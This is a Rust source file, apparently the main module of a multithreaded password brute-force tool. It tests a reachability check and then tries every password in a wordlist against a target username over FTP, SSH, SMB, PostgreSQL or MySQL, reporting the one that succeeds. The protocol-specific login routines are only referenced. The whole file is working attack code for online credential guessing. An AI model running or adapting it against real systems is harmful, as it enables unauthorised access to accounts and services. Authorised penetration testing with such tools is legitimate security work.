use indicatif::{ProgressBar, ProgressStyle};
use std::net::TcpStream;
use std::sync::{Arc, Mutex, mpsc};
use threadpool::ThreadPool;
use colored::Colorize;

//Connectivity testing
fn test_connection(address: &str) -> bool {
    match TcpStream::connect(address) {
        Ok(_) => true,
        Err(e) => {
            eprintln!("Failed to connect: {}", e);
            false
        },
    }
}

fn main() {

    // Enable support for virtual terminal mode in Windows
    #[cfg(windows)]
    display::enable_virtual_terminal_processing();
    
    //Call Arguments
    let args = arguments::parse_arguments();
    
    //Print our sweet banner
    display::banner();

    let port = &args.custom_port;
    
    //Start the bruteforce attack with the previous arguments
    let result = bruteforce(
        &args.protocol,
        &args.target_addr,
        &args.target_username,
        &args.file_path,
        port,
        args.smb_share.as_deref().unwrap_or(""),
        &args.db.unwrap_or_default(),
        &args.tasks,
        &args.delay,
        &args.show_password_testing
    );

    println!("{}", result);
}

fn bruteforce(protocol: &str, target_addr: &str, target_username: &str, file_path: &str, port: &str, smb_share: &str, db: &str, tasks: &str, delay: &str, show_password_testing: &str) -> &'static str {
    
    //Read wordlist file size to display in progress bar
    let total_size = file::count_lines(file_path).expect("Failed to count lines in wordlist");
    let pb = ProgressBar::new(total_size as u64);

    //Set Progress bar template/style
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.blue} [{elapsed_precise}] [{bar:40.yellow/blue}] {percent}% ->{pos:>7}/{len:7} {per_sec} {msg}")
            .unwrap(),
    );

    //Connectivity test. If the target address is unreachable, the tool will not continue. 
    if test_connection(&format!("{}:{}", target_addr, port)) {
        println!("{} Service is online\n", "[!]".green().bold());
    } else {
        println!("{} Service is Offline!", "[X]".red().bold());
        return "";
    }

    //Reads the contents of a wordlist file (line by line) and stores it (as a vector).
    let passwords = file::read_lines(file_path).expect("Failed to read wordlist").filter_map(Result::ok).collect::<Vec<_>>();
    let passwords = Arc::new(passwords);

    //Set the number of threads
    let pool = ThreadPool::new(tasks.parse().unwrap());
    let (tx, rx) = mpsc::channel();
    let smb_client_lock = Arc::new(Mutex::new(()));

    for password in passwords.iter() {
        let password = password.clone();
        let tx = tx.clone();
        let pb = pb.clone();

        //Make items live long enough
        let protocol = protocol.to_string(); let target_addr = target_addr.to_string(); let target_username = target_username.to_string(); 
        let port = port.to_string(); let smb_share = smb_share.to_string(); let db = db.to_string(); 
        let delay = delay.to_string();
        let show_password_testing = show_password_testing.to_string();
        let smb_client_lock = smb_client_lock.clone();

        //Running each thread for the attack
        pool.execute(move || {
            //Start ProgressBar
            pb.inc(1);
            
            //The user has the option of following the current password being tested
            if show_password_testing == "true" {
                pb.set_message(format!("\n|\n|=> password: {}", password.clone()));
            } else {
                pb.set_message("");
            }

            //The selected operating mode. Which network protocol have you chosen?
            let result = match protocol.as_str() {
                "ftp" => modes::validate_ftp(&target_addr, port.parse().unwrap(), &target_username, &password, delay.parse::<u64>().unwrap()),
                "ssh" => modes::validate_ssh(&format!("{}:{}", target_addr, port), &target_username, &password, delay.parse::<u64>().unwrap()),
                "smb" => modes::validate_smb(&target_addr, &port, &target_username, &password, &smb_share, "", delay.parse::<u64>().unwrap(), smb_client_lock),
                "pg" => modes::validate_postgres(&target_addr, &port, &target_username, &password, &db, delay.parse::<u64>().unwrap()),
                "mysql" => modes::validate_mysql(&target_addr, &port, &target_username, &password, &db, delay.parse::<u64>().unwrap()),
                _ => Err(()),
            };
            if result.is_ok() {
                tx.send(password).unwrap();
            }
        });
    }

    drop(tx);
    let result = rx.recv();

    //For each request, test whether it was successful 
    match result {
        Ok(password) => {
            pb.finish_and_clear();
            println!("{} Authentication successful with password: {}", "[✔]".green().bold(), password.blue().bold());
            "Finished!\n"
        }
        Err(_) => "Finished!",
    }
}
